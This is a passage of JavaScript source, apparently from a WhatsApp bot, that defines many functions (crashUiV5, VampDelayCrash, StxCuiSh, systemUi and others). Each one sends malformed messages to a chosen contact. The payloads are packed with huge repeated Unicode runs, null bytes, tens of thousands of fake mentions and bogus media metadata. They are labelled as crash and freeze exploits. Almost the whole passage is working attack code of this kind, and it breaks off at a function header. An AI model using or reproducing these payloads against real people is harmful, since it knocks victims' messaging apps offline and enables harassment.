                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "99988877766@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "uknown",
                                    songId: "870166291800508",
                                    author: "𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 𝟑" + "᭱".repeat(9999),
                                    title: "𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟐",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://t.me/FunctionLihX",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", protoMessage.message, {
        messageId: protoMessage.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: protoMessage.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}        

async function crashUiV5(sock, jid, Ptcp = false) {
    sock.relayMessage(jid, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "조로Nted Crash Gen6🐉버그" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "조로Nted Crash Gen6🐉버그"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: jid }, messageId: null });
};

async function VampDelayCrash(sock, jid) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "valores.cloud.net" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, message, { participant: { jid: jid } });
}

async function frezui(sock, jid) {
var msg = await generateWAMessageFromContent(jid, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "Please Look My Message\n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb // di ubh ke null atau kosong string jg bs
          },
          hasMediaAttachment: true
        },
        body: {
          text: "lu y team" + "@1".repeat(90000) + "ꦾ".repeat(90000) + "\u0000"
          
        },
        nativeFlowMessage: {
          messageParamsJson: "\u0000".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: jid,  })
await sock.relayMessage(jid, msg.message, { messageId: msg.key.id })
}

async function CrashPayloadNew(sock, jid) {
    const payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "惡조로Nted Crash Gen6🐉버그" + "ꦿ".repeat(45000) },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            buttons: Array(3).fill({
                                name: "cta_url",
                                buttonParamsJson: "\u200b".repeat(250)
                            })
                        })
                    },
                    header: { title: "惡조로Nted Crash Gen6🐉버그", hasMediaAttachment: false }
                }
            },
            messageContextInfo: {
                deviceListMetadata: {
                    senderKeyHash: crypto.randomBytes(16),
                    senderTimestamp: 999999999,
                    recipientKeyHash: crypto.randomBytes(16)
                },
                quotedMessage: {
                    buttonsMessage: {
                        contentText: "🚨 WhatsApp Beta Crash",
                        footerText: "Generated by RizxVelz",
                        buttons: [{
                            buttonId: "\u0000".repeat(250),
                            buttonText: { displayText: "𖤐 Crash Now 𖤐" },
                            type: 1
                        }],
                        headerType: 1
                    }
                },
                mentionedJid: [jid],
                externalAdReply: {
                    title: "Beta Crash Exploit",
                    mediaType: 1,
                    body: "ViewOnce + NativeButton + Quoted Combo",
                    sourceUrl: "https://whatsapp.com",
                    thumbnail: Buffer.from([1, 2, 3]) // fake buffer
                }
            }
        }
    };

    await sock.relayMessage(jid, payload, {
        messageId: crypto.randomBytes(10).toString("hex"),
        additionalNodes: [
            { tag: "meta", attrs: { dev: "Extorditcv" }, content: [] }
        ]
    });
}


async function btnStatus(sock, jid, mention) {
let msg = await generateWAMessageFromContent(jid, {
buttonsMessage: {
text: "🔥",
contentText: "༿༑ᜳᢶ⃟",
footerText: "☠️",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "⚡" + "\u0000".repeat(500000) }, type: 1 }
],
headerType: 1
}
}, {});

await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [jid],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: jid }, content: undefined }] }] }
]
});

if (mention) {
await sock.relayMessage(jid, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: msg.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "⚡ - 𝗦𝗡𝗶𝗧𝗖𝗛 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" }, content: undefined }
]
});
}
}

async function NewsletterZap(sock, jid) {
var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
'viewOnceMessage': {
'message': {
"newsletterAdminInviteMessage": {
"newsletterJid": `120363298524333143@newsletter`,
"newsletterName": "Script Goku" + "@1".repeat(60000) + "\u0000".repeat(920000),
"jpegThumbnail": "",
"caption": `Script sur notre chaîne WhatsApp`,
"inviteExpiration": Date.now() + 1814400000
}
}
}
}), {
'userJid': jid
});
await sock.relayMessage(jid, messageContent.message, {
'participant': {
'jid': jid
},
'messageId': messageContent.key.id
});
}

async function splashpayment(sock, jid) {
let virtex = `조로Nted Crash Gen6🐉버그\n ${vir1}${"ꦾ".repeat(103000)}`;
let apiClient = JSON.stringify({
status: true,
criador: "Nted WhatsApp API",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
sock.relayMessage(jid, {
interactiveMessage: {
contextInfo: {
stanzaId: jid,
participant: jid,
mentionedJid: [ jid, m.chat, "13135550002@s.whatsapp.net" ],
forwardingScore: 9117,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363330344810280@newsletter",
serverMessageId: null,
newsletterName: "ٯ".repeat(100)
},
externalAdReply: {
showAdAttribution: true,
title: `조로Nted Crash Gen6🐉버그`,
body: `${"\u0000".repeat(9117)}`,
mediaType: 1,
renderLargerThumbnail: true,
thumbnailUrl: null,
sourceUrl: ""
},
businessMessageForwardInfo: {
businessOwnerJid: jid,
},
dataSharingContext: {
showMmDisclosure: true,
},
quotedMessage: {
paymentInviteMessage: {
serviceType: 1,
expiryTimestamp: null
}
},
disappearingMode: {
initiator: "CHANGED_IN_CHAT",
trigger: "CHAT_SETTING"
}
},
body: { text: `${virtex}` },
footer: { text: " " },
nativeFlowMessage: {
messageParamsJson: `{\"name\":\"galaxy_message\",\"title\":\"${"\u200D".repeat(9117)}\",\"header\":\"${"\u200D".repeat(9117)}\",\"body\":\"${"\u200D".repeat(9117)}\"}`,
buttons: [
{
name: "single_select",
buttonParamsJson: apiClient + "\u0000".repeat(9117),
},
{
name: "single_select", buttonParamsJson: JSON.stringify({ status: true, criador: "Nted WhatsApp API", versao: "@latest", atualizado: "2025-04-15", suporte: "https://wa.me/13135550002", comandosDisponiveis: [`pp`], prefixo: `pler`, linguagem: "id" }) + "\u0003"
},
{
name: "single_select",
buttonParamsJson: apiClient + "\u0000".repeat(9117),
},
{
name: "single_select",
buttonParamsJson: apiClient + "\u0000".repeat(9117),
},
{
name: "call_permission_request",
buttonParamsJson: apiClient + "\u200D".repeat(9117), voice_call: "call_crash"
}, 
{
name: "call_permission_request",
buttonParamsJson: apiClient + "\u200D".repeat(9117),
}, 
{
name: "call_permission_request",
buttonParamsJson: apiClient + "\u200D".repeat(9117),
},
{
name: "cta_url",
buttonParamsJson: apiClient + "\u0003".repeat(9117),
},
{
name: "payment_method",
buttonParamsJson: apiClient + "\u0003".repeat(9117),
},
{
name: "payment_status",
buttonParamsJson: apiClient + "\u0003".repeat(9117),
},
{
name: "review_order",
buttonParamsJson: apiClient + "\u0003".repeat(9117),
},
],
},
inviteLinkGroupTypeV2: "DEFAULT"
}
}, {
participant: {
jid: jid
}
}, {
messageId: null
});
};



async function xatanicaldelayv2(sock, jid, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
                
async function CursorimgDoc(sock, jid) {
const buttons = [
{ buttonId: "\u0000".repeat(299999), buttonText: { displayText: "Haii?" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }, 
{
buttonId: "\u0000", 
buttonText: { displayText: '조로Nted Crash Gen6🐉버그' }, 
type: 1, 
nativeFlowInfo: { 
name: '조로Nted Crash Gen6🐉버그',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(220000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 2 
}
}
];
let messagePayload = {
viewOnceMessage: {
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"caption": "조로Nted Crash Gen6🐉버그" + "\u0000".repeat(199) + "ꦾ".repeat(15999), 
"fileSha256": "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
"fileLength": "99999999999",
"height": 307,
"width": 734,
"mediaKey": "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
"fileEncSha256": "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
"directPath": "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1738686532",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
"scansSidecar": "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
"scanLengths": [
2226,
6362,
4102,
6420
],
"midQualityFileSha256": "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA=", 
contextInfo: {
virtexId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: [jid, "0@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "조로Nted Crash Gen6🐉버그",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
caption: "조로Nted Crash Gen6🐉버그"
},
hasMediaAttachment: true,
contentText: "조로Nted Crash Gen6🐉버그",
footerText: "Why?",
buttons: buttons, 
viewOnce: true,
headerType: 3
}
}, 
isForwarded: true,
actionLink: {
url: "t.me/joomodz",
buttonTitle: "조로Nted Crash Gen6🐉버그"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363409362506610@newsletter",
serverMessageId: 1,
newsletterName: `조로Nted Crash Gen6🐉버그${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
}
}
}
}
}
};
await sock.relayMessage(jid, messagePayload, {
messageId: sock.generateMessageTag(), 
participant: { jid : jid }
});
}

async function protocol5(sock, jid, mention) {
    const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
      `1${Math.floor(Math.random() * 50000)}@s.whatsapp.net`
    )
  ];


    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "SNiTCH" + "ោꦾ៝".repeat(100000),
        title: "snitch⸙ꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ✦⸙ꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋ",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: jid }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function StxCuiSh(sock, jid) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "조로Nted Crash Gen6🐉버그",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "조로Nted Crash Gen6🐉버그"
                    },
                },
              },
            body: {
              text: "조로Nted Crash Gen6🐉버그" + "ꦾ".repeat(2500000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(jid, message, {
      participant: { jid: jid },
    });
  }
  
async function systemUi(sock, jid) {
    await sock.relayMessage(jid, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "ꦾ".repeat(300000) + "@1".repeat(70000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: ["1@newsletter"],
                        groupMentions: [{
                            groupJid: "1@newsletter",
                            groupSubject: "RxhL"
                        }],
                        quotedMessage: {
                            documentMessage: {
                                contactVcard: true
                            }
                        }
                    }
                }
            }
        }
    }, {
        participant: {
            jid: jid
        }
    }, {
        messageId: null
    });
}

// MENU COMMAND SECTION
function isOwner(userId) {
